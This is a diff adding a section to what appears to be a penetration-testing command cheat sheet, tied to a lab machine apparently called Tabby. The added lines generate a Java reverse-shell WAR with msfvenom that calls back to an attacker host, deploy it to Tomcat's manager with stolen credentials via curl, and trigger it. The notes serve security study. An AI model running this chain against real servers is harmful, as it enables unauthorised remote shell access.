@@ -185,3 +185,14 @@ get file access control lists
 ```
 getfacl /usr/local/monitoring
 ```
+
+Used in ```Tabby```
+
+```shell
+# create reverse shell
+msfvenom -p java/shell_reverse_tcp lhost=<attacker ip> lport=<attacker port> -f war -o shell.war
+# Tomcat role admin, manager and manager-script can remote deploy 
+curl -v -u 'tomcat:<password>' --upload-file shell.war "http://<target ip>:<port>/manager/text/deploy?path=/test&update=true"
+# trigger
+curl http://<target ip>:<port>/test/
+```
